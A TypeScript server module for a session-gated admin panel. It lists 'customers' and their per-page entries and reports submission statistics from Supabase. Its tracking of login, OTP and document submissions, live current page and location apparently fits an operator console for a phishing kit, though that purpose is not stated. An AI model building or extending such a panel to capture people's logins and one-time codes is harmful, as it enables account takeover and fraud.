import { createServerFn } from "@tanstack/react-start";
import { useSession } from "@tanstack/react-start/server";
import { createHash } from "node:crypto";

type AdminGateSession = { adminUnlocked?: boolean };

function sessionPassword() {
  const raw = `sham-admin:${process.env["ADMIN_USERNAME"] ?? ""}:${process.env["ADMIN_PASSWORD"] ?? ""}`;
  return createHash("sha256").update(raw, "utf8").digest("hex");
}

function getSessionConfig() {
  return {
    password: sessionPassword(),
    name: "sham-admin-gate-v3",
    maxAge: 60 * 60 * 8,
    cookie: { httpOnly: true, secure: true, sameSite: "lax" as const, path: "/" },
  };
}

async function assertUnlocked() {
  const session = await useSession<AdminGateSession>(getSessionConfig());
  if (session.data.adminUnlocked !== true) throw new Response("Unauthorized", { status: 401 });
}

export type PanelCustomer = {
  key: string;
  canonical_key: string | null;
  name: string | null;
  email: string | null;
  phone: string | null;
  session_id: string | null;
  country: string | null;
  city: string | null;
  first_at: string;
  last_at: string;
  sub_count: number;
  has_login: boolean;
  has_otp: boolean;
  has_logout: boolean;
  has_docs: boolean;
  current_page: string | null;
  current_page_at: string | null;
  request_id: string | null;
  request_status: string | null;
  request_reference: string | null;
};

export type PanelEntry = {
  id: string;
  kind: string;
  email: string | null;
  page: string | null;
  payload: Record<string, string | number | boolean | null | object> | null;
  created_at: string;
};

/** قائمة العملاء مجمّعة في قاعدة البيانات — صفحة واحدة في كل مرة مع العدد الإجمالي */
export const panelListCustomers = createServerFn({ method: "GET" })
  .inputValidator((data: { limit?: number; offset?: number; search?: string; status?: string; activity?: string }) => ({
    limit: Math.min(Math.max(Number(data?.limit ?? 100), 1), 500),
    offset: Math.max(Number(data?.offset ?? 0), 0),
    search: (data?.search ?? "").trim(),
    status: data?.status ?? "all",
    activity: data?.activity ?? "all",
  }))
  .handler(async ({ data }) => {
    await assertUnlocked();
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { data: rows, error } = await (supabaseAdmin as never as {
      rpc: (n: string, a: Record<string, unknown>) => Promise<{ data: unknown; error: { message: string } | null }>;
    }).rpc("panel_list_customers", {
      _limit: data.limit,
      _offset: data.offset,
      _search: data.search || null,
      _status: data.status,
      _activity: data.activity,
    });
    if (error) throw new Error(error.message);
    const list = (rows ?? []) as Array<PanelCustomer & { total_count: number }>;
    const total = list[0]?.total_count ?? 0;
    return {
      customers: list.map(({ total_count: _ignored, ...c }) => c) as PanelCustomer[],
      total: Number(total),
    };
  });

/** كل إدخالات عميل واحد — تُجلب فقط عند فتح بطاقته */
export const panelCustomerDetail = createServerFn({ method: "GET" })
  .inputValidator((data: { key: string }) => ({ key: String(data?.key ?? "") }))
  .handler(async ({ data }) => {
    await assertUnlocked();
    if (!data.key) return { entries: [] as PanelEntry[] };
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { data: rows, error } = await (supabaseAdmin as never as {
      rpc: (n: string, a: Record<string, unknown>) => Promise<{ data: unknown; error: { message: string } | null }>;
    }).rpc("panel_customer_detail", { _key: data.key });
    if (error) throw new Error(error.message);
    return { entries: (rows ?? []) as PanelEntry[] };
  });

/** أرقام شريط الإحصائيات */
export const panelStats = createServerFn({ method: "GET" }).handler(async () => {
  await assertUnlocked();
  const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
  const { data, error } = await (supabaseAdmin as never as {
    rpc: (n: string, a: Record<string, unknown>) => Promise<{ data: unknown; error: { message: string } | null }>;
  }).rpc("panel_stats", {});
  if (error) throw new Error(error.message);
  const row = ((data ?? []) as Array<Record<string, number>>)[0];
  return {
    totalSubmissions: Number(row?.["total_submissions"] ?? 0),
    todaySubmissions: Number(row?.["today_submissions"] ?? 0),
    totalRequests: Number(row?.["total_requests"] ?? 0),
    underReview: Number(row?.["under_review"] ?? 0),
    verified: Number(row?.["verified"] ?? 0),
    rejected: Number(row?.["rejected"] ?? 0),
  };
});
